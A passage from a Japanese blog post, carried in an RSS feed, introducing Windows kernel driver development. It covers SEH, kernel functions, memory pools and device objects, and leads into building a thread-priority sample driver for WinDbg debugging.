&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Windowsカーネルドライバを自作してWinDbgでIRP要求をのぞいてみる]]></title><link>https://kashiwaba-yuki.com/windows-windriver-002-irp</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windriver-002-irp</guid><pubDate>Sat, 29 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Windowsのカーネルデバッグを試す上で壁になったのが、詳細な仕様が公開されているカーネルドライバが少ないという壁にぶつかりました。&lt;/p&gt;
&lt;p&gt;なければ作ってしまおう、と思いカーネルドライバの開発を始めました。&lt;/p&gt;
&lt;p&gt;カーネルドライバの開発にあたっては、基本的に以下の書籍を参考にしつつ進めてます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3H3WMoe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;カーネルデバッグの設定方法については以下の記事でまとめてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-004-kernel-debug&quot;&gt;WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/windows-windriver-001-tutorial&quot;&gt;前回&lt;/a&gt;の記事ではDebugViewを設定してKdPrintでOSのバージョンを出力するだけのドライバを作成し、ライブデバッグを行いました。&lt;/p&gt;
&lt;p&gt;今回はもう少し動きのあるドライバを作成してデバッグをしていきたいと思います。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;カーネルプログラミングについて&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A8%E6%AF%94%E8%BC%83%E3%81%97%E3%81%9F%E5%A0%B4%E5%90%88%E3%81%AE%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E9%96%8B%E7%99%BA%E3%81%AE%E7%9B%B8%E9%81%95%E7%82%B9&quot;&gt;ユーザモードと比較した場合の、カーネルドライバ開発の相違点&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%A7%8B%E9%80%A0%E5%8C%96%E4%BE%8B%E5%A4%96%E5%87%A6%E7%90%86seh%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;構造化例外処理(SEH)について&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E9%96%A2%E6%95%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;カーネル関数について&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%AE%E3%83%A1%E3%83%A2%E3%83%AA%E5%89%B2%E3%82%8A%E5%BD%93%E3%81%A6%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;カーネルドライバのメモリ割り当てについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;デバイスオブジェクトについて&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%A8%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;カーネルドライバとクライアントアプリケーションを作成する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AE%E5%84%AA%E5%85%88%E9%A0%86%E4%BD%8D&quot;&gt;スケジュールの優先順位&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#driverentry%E9%96%A2%E6%95%B0%E3%82%92%E4%BD%9C%E3%82%8B&quot;&gt;DriverEntry関数を作る&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#driverentry%E9%96%A2%E6%95%B0%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;DriverEntry関数を読む&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%83%91%E3%83%83%E3%83%81%E3%83%AB%E3%83%BC%E3%83%81%E3%83%B3%E3%81%AE%E3%82%B5%E3%83%9D%E3%83%BC%E3%83%88&quot;&gt;ディスパッチルーチンのサポート&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E9%96%A2%E6%95%B0%E3%81%8C%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E6%96%87%E5%AD%97%E5%88%97&quot;&gt;カーネル関数が使用する文字列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;デバイスオブジェクトの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AA%E3%83%83%E3%82%AF%E3%83%AA%E3%83%B3%E3%82%AF%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;シンボリックリンクの作成&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%83%91%E3%83%83%E3%83%81%E3%83%AB%E3%83%BC%E3%83%81%E3%83%B3%E3%81%AB%E5%89%B2%E3%82%8A%E5%BD%93%E3%81%A6%E3%82%8B%E3%83%AB%E3%83%BC%E3%83%81%E3%83%B3%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot;&gt;ディスパッチルーチンに割り当てるルーチンのセットアップ&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%96%A2%E6%95%B0%E3%82%A2%E3%83%8E%E3%83%86%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3&quot;&gt;関数アノテーション&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#irp%E3%81%AE%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8A&quot;&gt;IRPの受け取り&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot;&gt;デバイスコントロールのセットアップ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%8F%BE%E5%9C%A8%E3%81%AE%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%8F%96%E5%BE%97&quot;&gt;現在のスタックロケーションの取得&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A6%81%E6%B1%82%E3%81%95%E3%82%8C%E3%81%9F%E5%84%AA%E5%85%88%E9%A0%86%E4%BD%8D%E3%82%92%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;要求された優先順位をスレッドに設定する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB&quot;&gt;ドライバのインストール&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%A7%E6%8C%99%E5%8B%95%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot;&gt;カーネルデバッグで挙動を確認してみる&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;ブレークポイントを設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#irp%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot;&gt;IRPを解析する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;カーネルプログラミングについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;カーネルプログラミングについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルプログラミングについて&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/3H3WMoe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;を参考にカーネルドライバの開発を行っています。&lt;/p&gt;
&lt;p&gt;前回インストールしたWDK(Windows Driver Kit)にはカーネルドライバ開発で使用するライブラリとヘッダファイルが格納されています。&lt;/p&gt;
&lt;p&gt;カーネルAPIはC言語の関数群で構成されていますが、ユーザモード開発とは主に以下の点で異なります。&lt;/p&gt;
&lt;h3 id=&quot;ユーザモードと比較した場合のカーネルドライバ開発の相違点&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A8%E6%AF%94%E8%BC%83%E3%81%97%E3%81%9F%E5%A0%B4%E5%90%88%E3%81%AE%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E9%96%8B%E7%99%BA%E3%81%AE%E7%9B%B8%E9%81%95%E7%82%B9&quot; aria-label=&quot;ユーザモードと比較した場合のカーネルドライバ開発の相違点 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ユーザモードと比較した場合の、カーネルドライバ開発の相違点&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/3H3WMoe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;よりユーザモードと比較した場合の、カーネルドライバ開発の相違点について引用します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未処理の例外発生時、システムをクラッシュさせる(BSOD)&lt;/li&gt;
&lt;li&gt;プロセスの終了時のアンロードルーチンでリソースを解放する必要がある(解放されない場合はリークが発生する)&lt;/li&gt;
&lt;li&gt;カーネルドライバ開発時のエラーは決して無視してはいけない&lt;/li&gt;
&lt;li&gt;IRQLが0より大きくなる場合がある&lt;/li&gt;
&lt;li&gt;埋め込まれたバグがシステム全体に影響を及ぼす可能性がある&lt;/li&gt;
&lt;li&gt;デバッグは他のマシンからリモートデバッグする必要がある&lt;/li&gt;
&lt;li&gt;ほとんどの標準ライブラリは使えない&lt;/li&gt;
&lt;li&gt;例外処理に使えるのは&lt;code class=&quot;language-text&quot;&gt;Structured Exception Handling(SEH)&lt;/code&gt;のみ&lt;/li&gt;
&lt;li&gt;C++ランタイムが利用できない&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;構造化例外処理sehについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%A7%8B%E9%80%A0%E5%8C%96%E4%BE%8B%E5%A4%96%E5%87%A6%E7%90%86seh%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;構造化例外処理sehについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;構造化例外処理(SEH)について&lt;/h3&gt;
&lt;p&gt;SEHはハードウェア障害などの特定の例外コードの状況を適切に処理するための機能です。&lt;/p&gt;
&lt;p&gt;SEHを使用することで、例外が発生した場合でも、メモリブロックやファイルなどのリソースが正常に解放されるようにプログラムを書くことができるようになります。&lt;/p&gt;
&lt;p&gt;SEHでは、「例外ハンドラ」と「終了ハンドラ」の2つのメカニズムを利用できます。&lt;/p&gt;
&lt;p&gt;例外ハンドラは特定のエラーに対応するために使用されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/cpp/cpp/writing-an-exception-handler?view=msvc-170&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;例外ハンドラーの記述 | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一方、終了ハンドラはコードブロックの処理が正常に終了したか例外が発生したかに関わらず常に実行させることができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/cpp/cpp/writing-a-termination-handler?view=msvc-170&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;終了ハンドラーの記述 | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;カーネルドライバ開発を行う場合は、SEHを使い、上記のいずれかを用いて例外処理を実装していく必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Structured Exception Handling (C/C++) | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;カーネル関数について&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E9%96%A2%E6%95%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;カーネル関数について permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネル関数について&lt;/h3&gt;
&lt;p&gt;カーネルドライバ開発の際にはCの標準ライブラリは基本的には使用できません。&lt;/p&gt;
&lt;p&gt;カーネルドライバ開発では、カーネルのコンポーネントからエクスポートされている関数を使用します。&lt;/p&gt;
&lt;p&gt;多くのカーネル関数は&lt;code class=&quot;language-text&quot;&gt;Ntoskrnl.exe&lt;/code&gt;の中で実装されています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Ntoskrnl.exe&lt;/code&gt;で実装されている関数には、文書化されているものと文書化されていないものがあります。&lt;/p&gt;
&lt;p&gt;カーネル関数の名前にはある程度規則性があり、目的ごとに接頭語が付属しています。&lt;/p&gt;
&lt;p&gt;接頭語の対応表については以下のWikipediaページに詳しく書いてありました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Ntoskrnl.exe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ntoskrnl.exe - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文書化されているカーネル関数については以下のページなどから参照することができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/ddi/_kernel/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windows kernel - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;カーネルドライバのメモリ割り当てについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%AE%E3%83%A1%E3%83%A2%E3%83%AA%E5%89%B2%E3%82%8A%E5%BD%93%E3%81%A6%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;カーネルドライバのメモリ割り当てについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルドライバのメモリ割り当てについて&lt;/h3&gt;
&lt;p&gt;カーネルはドライバが利用可能な以下の2つのメモリプールを提供しています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ページプール：必要に応じてページアウトされる領域&lt;/li&gt;
&lt;li&gt;非ページプール：ページアウトされない領域&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;また、非ページプールは実行が可能な領域と実行不可の領域をそれぞれ制御することができます。&lt;/p&gt;
&lt;p&gt;ページングを行わない非ページプールを使用すればページフォールトが発生しないことが保証されますが、ドライバ開発を行う場合は可能な限りページプールで開発することが推奨されるようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepool&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ExAllocatePool function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;デバイスオブジェクトについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;デバイスオブジェクトについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デバイスオブジェクトについて&lt;/h3&gt;
&lt;p&gt;カーネルドライバは原則として1つ以上のデバイスオブジェクトを作成する必要があります。&lt;/p&gt;
&lt;p&gt;デバイスオブジェクトとは、OSがデバイスを表すために使用されるものです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/kernel/introduction-to-device-objects&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;デバイス オブジェクトの概要 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;デバイスオブジェクトは&lt;code class=&quot;language-text&quot;&gt;DEVICEOBJECT&lt;/code&gt;構造体のインスタンスとして作成されます。&lt;/p&gt;
&lt;p&gt;カーネルドライバは、デバイスオブジェクトを経由してクライアントアプリケーションと通信を行います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;&lt;em&gt;DEVICE&lt;/em&gt;OBJECT (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;カーネルドライバとクライアントアプリケーションを作成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%A8%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;カーネルドライバとクライアントアプリケーションを作成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルドライバとクライアントアプリケーションを作成する&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/3H3WMoe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;の4章で解説されているコードを写経しつつSecondDriverSampleの開発を行っていきます。&lt;/p&gt;
&lt;p&gt;4章では、スレッドの優先度をコントロールするカーネルドライバとクライアントアプリケーションのセットを作成しました。&lt;/p&gt;
